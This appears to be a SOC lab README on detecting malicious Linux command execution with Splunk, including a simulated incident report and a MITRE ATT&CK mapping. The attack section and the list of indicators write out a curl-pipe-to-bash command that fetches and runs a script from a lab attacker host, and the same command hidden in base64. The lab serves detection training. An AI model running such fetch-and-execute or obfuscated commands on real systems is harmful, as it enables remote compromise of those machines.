🛡️ Suspicious Remote Command Execution Detection (Linux SOC Lab)

---

## 📌 Project Overview

This lab demonstrates detection of **malicious command execution on Linux** using:

- Remote script download and execution (`curl | bash`)
- Base64 obfuscated command execution
- Log analysis using Splunk SIEM

---

## 🎯 Objective

To simulate attacker techniques and detect:

- Remote payload execution  
- Command obfuscation using base64  
- Suspicious shell activity  

---

## 🧪 Lab Environment

| Component | Role |
|----------|------|
| Kali Linux | Attacker (payload hosting) |
| Ubuntu | Victim (command execution) |
| Splunk (Windows) | SIEM for log analysis |

---

## ⚔️ Attack Simulation

### 🔴 Attack 1 — Remote Script Execution

```bash
curl http://192.168.1.64:8000/shell.sh | bash
📸 Evidence (Ubuntu Screenshot)
Command executed successfully
Output observed:
Malicious script executed
🔴 Attack 2 — Base64 Obfuscated Execution
echo "curl http://192.168.1.64:8000/shell.sh | bash" | base64
echo <BASE64_STRING> | base64 -d | bash
📸 Evidence (Ubuntu Screenshot)
Base64 encoded string generated
Decoded and executed successfully
Output observed:
Malicious script executed
📊 Log Source Observed in Splunk
/var/log/syslog
/var/log/auth.log
🔎 Splunk Detection Query Used
index=* ("curl" OR "base64" OR "bash")
📸 Evidence (Splunk Screenshot)

The following activities were observed:

Multiple /usr/bin/bash executions

Base64 decoding activity:

Base64 Decoding: Enabled
Shell session activity from users
System logs indicating command execution context
🚨 SOC L2 INCIDENT REPORT
⏰ Time of Activity

26 March 2026 (~20:00 IST)

💻 Affected Entities
Host: Ubuntu Virtual Machine
User: bluevarun
Source IP: 192.168.1.64 (Kali Linux)
Log Sources:
syslog
auth.log
🔍 Indicators of Compromise (IOCs)

Execution of remote command using:

curl http://192.168.1.64:8000/shell.sh | bash
Base64 encoded command execution
Presence of multiple bash executions
Base64 decoding activity in logs
External communication to attacker-controlled system
✅ Classification: TRUE POSITIVE
🧠 Reason for Classifying as True Positive
Confirmed execution of attacker-hosted script
Command executed directly in memory using pipe (curl | bash)
Obfuscation technique (base64) used to hide intent
Logs show correlated suspicious behavior:
bash execution
base64 decoding
Activity aligns with known attacker techniques
🚨 Reason for Escalating the Alert
Unauthorized remote code execution detected
Obfuscation indicates intentional evasion
External network communication observed
Potential system compromise
🚑 Recommended Remediation Actions
Block outbound traffic to untrusted IP addresses
Restrict use of curl/wget for script execution
Monitor and alert on base64 execution patterns
Implement command execution monitoring
Apply least privilege access controls
🧬 MITRE ATT&CK Mapping
Technique	ID
Command Execution	T1059
Obfuscated Files / Information	T1027
Ingress Tool Transfer	T1105
